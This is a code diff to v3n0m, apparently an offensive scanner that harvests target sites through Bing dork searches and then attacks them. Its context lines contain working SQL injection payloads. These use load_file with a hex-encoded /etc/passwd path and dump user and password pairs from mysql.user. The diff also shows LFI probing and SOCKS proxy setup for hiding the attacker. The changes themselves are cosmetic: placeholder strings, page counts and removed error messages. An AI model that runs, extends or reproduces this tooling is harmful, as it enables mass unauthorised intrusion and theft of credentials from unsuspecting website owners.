@@ -29,7 +29,7 @@ except:
     print("[1] Run Pip3 and Auto-Update Python3 modules to latest versions, Requires Sudo or Root")
     print("[2] Run Pip3 and Auto-Install all the required v3n0m modules, Requires Sudo  or Root")
     print("[3] Exit")
-    print(" Note: Both recovery options will at the end, will perform a check at the end so everything is upto date")
+    print(" Note: Both recovery options will at the end, perform a check at the end so everything is upto date")
     chce = input(":")
     import time
     import pip
@@ -68,7 +68,7 @@ except:
 # Banner
 def logo():
     print(R + "\n|----------------------------------------------------------------|")
-    print("| Release Date 06/10/2016                                        |")
+    print("| Release Date 07/10/2016                                        |")
     print("|                                                                |")
     print("|        Proxy Enabled " + G + " [",ProxyEnabled,"] " + R + "                               |")
     print("|                                                                |")
@@ -169,7 +169,7 @@ def classiclfi(url):
                 try:
                     request_web = urllib.request.Request(target)
                     request_web.add_header('User-Agent', header)
-                    request_web.add_header = [("connection", "keep-alive"), ("Cookie")]
+                    request_web.add_header = [("connection", "keep-alive"), "Cookie"]
                     text = urllib.request.urlopen(request_web)
                     text = text.read()
                     if re.findall(str('7ca328e93601c940f87d01df2bbd1972'), text):
@@ -520,7 +520,7 @@ def colfinder():
         print("\n[!] Sorry column length could not be found\n")
     print(B + "\n[+] Gathering MySQL Server Configuration...")
     for site in darkurl:
-        head_url = site.replace("evilzone",
+        head_url = site.replace("2600",
                                 "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
         print(R + "\n[+] Target:", O + site)
         while 1:
@@ -535,26 +535,26 @@ def colfinder():
                     print(W + "\n\tDatabase:", database)
                     print("\tUser:", user)
                     print("\tVersion:", version)
-                    load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
+                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                     source = urllib.request.urlopen(load).read()
                     if re.findall(str("root:x"), source):
-                        load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + str(file.encode(
+                        load = site.replace("2600", "concat_ws(char(58),load_file(0x" + str(file.encode(
                             "hex")) + "),0x62616c74617a6172)")
                         source = urllib.request.urlopen(load).read()
                         search = re.findall(str("NovaCygni"), source)
                         if len(search) > 0:
-                            print("\n[!] w00t!w00t!: " + site.replace("evilzone",
+                            print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                       "load_file(0x" + str(file.encode("hex")) + ")"))
-                        load = site.replace("evilzone",
+                        load = site.replace("2600",
                                             "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
                     source = urllib.request.urlopen(load).read()
                     if re.findall(str("NovaCygni"), source):
-                        print("\n[!] w00t!w00t!: " + site.replace("evilzone",
+                        print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                   "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user")
                 print(W + "\n[+] Number of tables:", len(tables))
                 print("[+] Number of columns:", len(columns))
                 print("[+] Checking for tables and columns...")
-                target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
+                target = site.replace("2600", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
                 for table in tables:
                     try:
                         target_table = target.replace("T", table)
@@ -621,8 +621,8 @@ def fscan():
             loaded_Dorks.append(d0rk[i])
             i += 1
     numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
-    pages_pulled_as_one = input('Enter no. of Search Engine Pages \n'
-                                'to be scanned per d0rk, Between 20 and 100   : ')
+    pages_pulled_as_one = input('Enter no. of Search Engine Pages to be scanned per d0rk,  \n'
+                                ' Between 20 and 100, increments of 20. Ie> 20:40:60:80:100   : ')
     print("\nNumber of SQL errors :", "26")
     print("LFI payloads    :", len(lfis))
     print("XSS payloads    :", len(xsses))
@@ -890,11 +890,11 @@ async def search(pages_pulled_as_one):
                 query = dork + "+site:"
                 futures = []
                 loop = asyncio.get_event_loop()
-                for i in range(10):
+                for i in range(20):
                     results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                         (page + i) * 50 + 1) + "&count=50"
                     futures.append(loop.run_in_executor(None, ignoringGet, results_web))
-                page += 10
+                page += 20
                 stringreg = re.compile('(?<=href=")(.*?)(?=")')
                 names = []
                 for future in futures:
@@ -926,7 +926,7 @@ async def search(pages_pulled_as_one):
                                                   "| Collected urls: %s Since start of scan \n"
                                                    " | D0rks: %s/%s Progressed so far \n"
                                                    " | Percent Done: %s \n"
-                                                   " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
+                                                   " | Current page no.: <%s> in Cycles of 20 Page results pulled in Asyncio\n"
                                                    " | Dork In Progress: %s\n"
                                                    " | Elapsed Time: %s\n" % (R +
                                                                               site, repr(urls_len), dark, darklen,
@@ -937,7 +937,7 @@ async def search(pages_pulled_as_one):
                     page = int(pages_pulled_as_one)
                 urls_len_last = urls_len
     tmplist = []
-    print("\n\n[+] URLS (unsorted): ", len(urls))
+    print("\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ", len(urls))
     for url in urls:
         try:
             host = url.split("/", 3)
@@ -962,7 +962,7 @@ async def search(pages_pulled_as_one):
             else:
                 pass
             continue
-    print("[+] URLS (sorted)  : ", len(finallist))
+    print("[+] URLS (sorted)  : Trash, Duplicates, Dead-Links and other rubbish removed ", len(finallist))
     return finallist
 
 
@@ -1083,7 +1083,7 @@ def enable_proxy():
         print(" Please enter Proxy Port - ie. 1076  :")
         proxyport = input(int)
         if proxytype == str("socks4"):
-            if requiresID == True:
+            if requiresID:
                 try:
                     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport,
                                           username=input("Proxy Account Username  :"),
@@ -1092,7 +1092,6 @@ def enable_proxy():
                     print(" Socks 4 Proxy Support Enabled")
                     ProxyEnabled = True
                 except Exception:
-                    print("Something went wrong setting the proxy please submit a bug report Code:0x05")
                     pass
             else:
                 try:
@@ -1101,10 +1100,9 @@ def enable_proxy():
                     print(" Socks 4 Proxy Support Enabled")
                     ProxyEnabled = True
                 except Exception:
-                    print("Something went wrong setting the proxy please submit a bug report Code:0x04")
                     pass
         elif proxytype == str("socks5"):
-            if requiresID == True:
+            if requiresID:
                 try:
                     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport,
                                           username=input("Proxy Account Username  :"),
@@ -1113,7 +1111,6 @@ def enable_proxy():
                     socks.socket = socks.socksocket
                     ProxyEnabled = True
                 except Exception:
-                    print("Something went wrong setting the proxy please submit a bug report Code:0x03")
                     pass
             else:
                 try:
@@ -1122,10 +1119,8 @@ def enable_proxy():
                     print(" Socks 5 Proxy Support Enabled")
                     ProxyEnabled = True
                 except Exception:
-                    print("Something went wrong setting the proxy please submit a bug report Code:0x02")
                     pass
     except Exception:
-        print("Something went wrong setting the proxy please submit a bug report Code:0x01")
         pass
 
 
